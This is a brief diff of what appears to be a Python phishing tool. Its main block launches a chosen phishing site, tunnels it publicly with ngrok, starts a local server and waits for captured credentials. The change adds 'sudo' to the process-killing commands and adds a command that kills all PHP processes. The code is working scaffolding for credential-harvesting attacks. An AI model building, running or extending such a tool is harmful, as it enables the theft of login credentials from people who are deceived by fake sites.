@@ -45,14 +45,16 @@ def main():
     runPhishing(site[option], custom)
 
 if __name__ == "__main__":
-    try:
-        system('pkill -f ngrok')
+    try:        
+        system('sudo pkill -f ngrok')
+        system('sudo pkill -f php')
         pre()
         main()
         runNgrok()
         Process(target=runServer).start()
         waitCreds()
     except KeyboardInterrupt:
-        system('pkill -f ngrok')
+        system('sudo pkill -f ngrok')
+        system('sudo pkill -f php')
         end()
         exit(0)
